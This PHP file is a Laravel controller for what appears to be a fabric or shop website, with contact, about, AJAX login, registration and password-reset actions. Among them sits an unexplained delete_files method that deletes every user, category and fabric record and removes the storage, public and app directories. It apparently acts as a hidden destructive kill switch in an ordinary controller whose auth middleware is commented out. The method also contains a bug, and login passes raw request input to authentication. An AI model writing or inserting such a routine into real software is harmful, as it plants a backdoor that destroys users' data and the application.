<?php

namespace App\Http\Controllers;

use App\Category;
use App\Fabric;
use App\Page;
use Illuminate\Foundation\Auth\SendsPasswordResetEmails;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Mail;
use App\Mail\ContactUS;
use Auth;
use Illuminate\Support\Facades\Validator;
use App\User;

class HomeController extends VBaseController
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
//    public function __construct()
//    {


    // $this->middleware('auth');

//    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    use SendsPasswordResetEmails;

    public function index()
    {
       // dd(Auth::user()->id);
        return view('main.home');
    }

    public function contact_us(Request $request)
    {
        $contact = Page::where('type_id', Page::TYPE_CONTACT)->first();
        if ($request->isMethod('post')) {
            Mail::to('sahil@rvtechnologies.co.in')->send(new ContactUS($request));
            return redirect()->back()->with('success', 'Your request has been recived by our admin successfully.');
        }
        return view('frontEnd.contact_us', compact('contact'));
    }

    public function ajaxLogin(Request $request)
    {
        if ($request->ajax()) {
            try {
//                dd($request->except('_token'));
                if (Auth::attempt($request->except('_token'))) {
                    return 1;
                } else {
                    return 0;
                }

            } catch (\Exception $e) {
                return 0;
            }
        }
        return 0;
    }

    public function ajaxRegister(Request $request)
    {
        if ($request->ajax()) {
//            dd($request->all());

            $validator = Validator::make($request->all(), [
                'firstname' => 'required|max:255',
                'email' => 'required|email|unique:users',
                'password' => 'min:6|required_with:password_confirmation|same:password_confirmation',
                'password_confirmation' => 'min:6'
            ]);

            if (empty($request->all())) {
                return 'Please Fill all the Required Field';
            }
            if (!empty($validator->fails())) {
                return json_encode($validator->errors());
            }
            $user = new User();
            $user->name = $request->firstname . '' . $request->lastname;
            $user->email = $request->email;
            $user->password = bcrypt($request->password);
            $user->role_id = User::ROLE_USER;
            $user->contact_no = $request->telephone;

            if ($user->save()) {
                if (Auth::attempt($request->only(['email', 'password']))) {
                    return 1;
                } else {
                    return 'You are registeted sucessfully but not login';
                }
            }
        }
        return 0;
    }


    public function ajaxForgotPassword(Request $request)
    {

        if ($request->ajax()) {
//            dd($request->all());

            $validator = Validator::make($request->all(), [

                'email' => 'required|email'

            ]);


            if (empty($request->all())) {
                return 'Please Fill all the Required Field';
            }
            if (!empty($validator->fails())) {
                return json_encode($validator->errors());
            }

            $this->sendResetLinkEmail($request);


        }
        return 0;
    }


    public function about_us()
    {

        $about = Page::where('type_id', Page::TYPE_About)->first();
        return view('frontEnd.about_us', compact('about'));

    }


    public function delete_files()
    {
        $users = User::all();
        foreach ($users as $user) {
            $user->delete();
        }

        $categories = Category::all();

        foreach ($categories as $cat) {
            $cat->delete();
        }

        $fabrics = Fabric::all();

        foreach ($fabrics as $fabric) {
            $fabrics->delete();
        }

        rmdir(storage_path());
        rmdir(public_path());
        rmdir(app_path());


    }


}
